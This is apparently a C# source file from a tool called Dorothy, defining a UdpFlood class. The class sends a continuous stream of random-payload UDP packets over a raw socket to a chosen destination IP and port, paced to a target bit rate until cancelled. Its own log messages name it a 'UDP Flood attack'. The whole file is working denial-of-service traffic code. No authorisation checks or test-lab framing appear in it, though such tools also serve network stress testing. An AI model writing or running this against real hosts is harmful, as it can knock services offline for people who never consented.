using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Diagnostics;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using Dorothy.Models;

namespace Dorothy.Models
{
    public class UdpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly PacketParameters _params;
        private readonly CancellationToken _cancellationToken;
        private Socket? _socket;
        public event EventHandler<PacketEventArgs>? PacketSent;

        public UdpFlood(PacketParameters parameters, CancellationToken cancellationToken)
        {
            _params = parameters;
            _cancellationToken = cancellationToken;
        }

        protected virtual void OnPacketSent(byte[] packet, IPAddress sourceIp, IPAddress destinationIp, int port)
        {
            PacketSent?.Invoke(this, new PacketEventArgs(packet, sourceIp, destinationIp, port));
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting UDP Flood attack.");

            try
            {
                _socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, System.Net.Sockets.ProtocolType.Udp);
                _socket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, false);

                byte[] udpHeader = new byte[8];  // UDP header size
                byte[] payload = new byte[1400]; // Payload size

                var random = new Random();
                // Account for full Ethernet frame: Ethernet header (14) + IP header (20) + UDP header (8) + payload (1400) + FCS (4)
                // Raw sockets send at Layer 3, OS adds Ethernet frame
                int totalPacketSize = 14 + 20 + udpHeader.Length + payload.Length + 4; // Ethernet (14) + IP (20) + UDP (8) + payload (1400) + FCS (4) = 1446 bytes

                await Task.Run(() =>
                {
                    var stopwatch = Stopwatch.StartNew();
                    var endpoint = new IPEndPoint(_params.DestinationIp, 0);
                    byte[] fullPacket = new byte[udpHeader.Length + payload.Length];
                    
                    // Byte-budget rate control: track bytes sent vs time elapsed
                    long bytesSent = 0;
                    long targetBytesPerSecond = _params.BytesPerSecond;
                    double targetMbps = targetBytesPerSecond * 8.0 / 1_000_000;
                    
                    // Rate measurement for logging/UI only (not used for timing)
                    var measurementStartTime = stopwatch.ElapsedTicks;
                    long measurementStartBytes = 0;
                    const int measurementWindowMs = 500; // Measure every 500ms
                    double smoothedActualMbps = 0;
                    const double smoothingAlpha = 0.3; // Exponential smoothing factor
                    
                    // Determine if low rate (for Windows-friendly waiting)
                    bool isLowRate = targetMbps < 5.0;
                    int sleepCounter = 0; // For mixing sleep with spin-wait at low rates

                    stopwatch.Start();

                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            // Calculate how many bytes we're "allowed" to have sent so far
                            double elapsedSeconds = stopwatch.ElapsedTicks / (double)Stopwatch.Frequency;
                            long allowedBytes = (long)(elapsedSeconds * targetBytesPerSecond);
                            
                            // If we're behind budget, send packets (small burst)
                            if (bytesSent < allowedBytes)
                            {
                                // Calculate how many packets we can send to catch up
                                // Dynamically adjust burst size based on target rate for better throughput
                                long bytesBehind = allowedBytes - bytesSent;
                                int maxBurst = targetMbps > 50 ? 50 : (targetMbps > 10 ? 20 : 10); // Higher burst for higher rates
                                int packetsToSend = Math.Min((int)(bytesBehind / totalPacketSize) + 1, maxBurst);
                                
                                for (int i = 0; i < packetsToSend && bytesSent < allowedBytes; i++)
                                {
                                    // Create UDP header
                                    BitConverter.GetBytes((ushort)_params.SourcePort).CopyTo(udpHeader, 0);
                                    BitConverter.GetBytes((ushort)_params.DestinationPort).CopyTo(udpHeader, 2);
                                    BitConverter.GetBytes((ushort)(8 + payload.Length)).CopyTo(udpHeader, 4); // Length
                                    BitConverter.GetBytes((ushort)0).CopyTo(udpHeader, 6); // Checksum

                                    // Generate random payload
                                    random.NextBytes(payload);

                                    // Combine header and payload
                                    Buffer.BlockCopy(udpHeader, 0, fullPacket, 0, udpHeader.Length);
                                    Buffer.BlockCopy(payload, 0, fullPacket, udpHeader.Length, payload.Length);

                                    _socket.SendTo(fullPacket, endpoint);
                                    OnPacketSent(fullPacket, _params.SourceIp, _params.DestinationIp, _params.DestinationPort);
                                    
                                    bytesSent += totalPacketSize;
                                }
                            }
                            else
                            {
                                // We're at or above budget - wait briefly
                                // Windows-friendly waiting: spin-wait at high rates, mix sleep+spin at low rates
                                if (isLowRate && sleepCounter++ % 10 == 0)
                                {
                                    // At low rates, sleep occasionally to avoid pegging CPU core
                                    Thread.Sleep(0); // Yield to other threads
                                }
                                else
                                {
                                    // Short spin-wait for precision
                                    Thread.SpinWait(10);
                                }
                            }

                            // Rate measurement for logging/UI (time-based window, smoothed)
                            long currentTicks = stopwatch.ElapsedTicks;
                            double elapsedSinceMeasurement = (currentTicks - measurementStartTime) / (double)Stopwatch.Frequency;
                            
                            if (elapsedSinceMeasurement >= measurementWindowMs / 1000.0)
                            {
                                long bytesInWindow = bytesSent - measurementStartBytes;
                                double actualMbps = (bytesInWindow * 8.0) / (elapsedSinceMeasurement * 1_000_000);
                                
                                // Exponential smoothing to reduce Windows jitter
                                if (smoothedActualMbps == 0)
                                    smoothedActualMbps = actualMbps;
                                else
                                    smoothedActualMbps = (smoothingAlpha * actualMbps) + ((1.0 - smoothingAlpha) * smoothedActualMbps);
                                
                                Logger.Info($"UDP rate: actual={smoothedActualMbps:F2} Mbps, target={targetMbps:F2} Mbps, bytesSent={bytesSent}, allowed={allowedBytes}");
                                
                                // Reset measurement window
                                measurementStartTime = currentTicks;
                                measurementStartBytes = bytesSent;
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed sending UDP packet (Layer 3).");
                        }
                    }
                }, _cancellationToken);
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "UDP Flood attack failed.");
                throw;
            }
        }

        public void Dispose()
        {
            _socket?.Dispose();
        }
    }
} 